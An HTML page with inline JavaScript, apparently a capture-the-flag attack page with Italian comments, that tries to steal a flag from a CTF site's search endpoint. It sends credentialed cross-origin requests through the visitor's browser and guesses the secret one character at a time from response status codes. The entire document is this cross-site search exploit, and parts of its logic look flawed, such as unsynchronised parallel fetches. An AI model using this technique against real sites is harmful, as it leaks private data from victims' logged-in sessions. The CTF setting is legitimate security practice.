<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <div id="results"></div>

    <script>
        const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
        let currentFlag = ''; // Iniziamo con una flag vuota
        let position = 0; // Posizione corrente

        // Funzione per testare i caratteri della flag
        const testChar = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare

            if (position >= currentFlag.length + 1) {
                // Se abbiamo testato tutti i caratteri per la lunghezza attuale, aumenta la lunghezza
                position = currentFlag.length; // Imposta la posizione alla lunghezza corrente
                currentFlag += chars[0]; // Inizia con il primo carattere
                console.log(`Iniziamo a testare la nuova lunghezza: ${currentFlag}`);
            }

            for (let char of chars) {
                const query = `${baseUrl}${currentFlag.slice(0, position)}${char}`; // Aggiungi il carattere alla query
                fetch(query, {
                    method: 'GET',
                    credentials: 'include', // Include i cookie di sessione
                    mode: 'cors' // Imposta CORS
                })
                .then(response => {
                    if (response.ok) {
                        // Se la risposta Ã¨ valida, aggiorna la flag e prova il prossimo carattere
                        currentFlag = currentFlag.slice(0, position) + char;
                        console.log(`Trovato: ${currentFlag}`);
                        document.getElementById('results').innerText += `Trovato: ${currentFlag}\n`;
                        position++; // Passa alla prossima posizione
                        testChar(); // Chiama ricorsivamente
                        return; // Interrompe il ciclo
                    } else if (response.status === 404) {
                        // Se riceviamo un 404, considera che abbiamo finito
                        console.log(`Carattere ${char} non valido per la posizione ${position}. Flag conclusa: ${currentFlag}`);
                        document.getElementById('results').innerText += `Flag conclusa: ${currentFlag}\n`;
                        return; // Termina il processo
                    } else {
                        console.log(`Carattere ${char} non valido per la posizione ${position}`);
                    }
                })
                .catch(error => console.error('Errore:', error));
            }
        };

        // Inizia il processo di test dei caratteri
        testChar();
    </script>
</body>
</html>
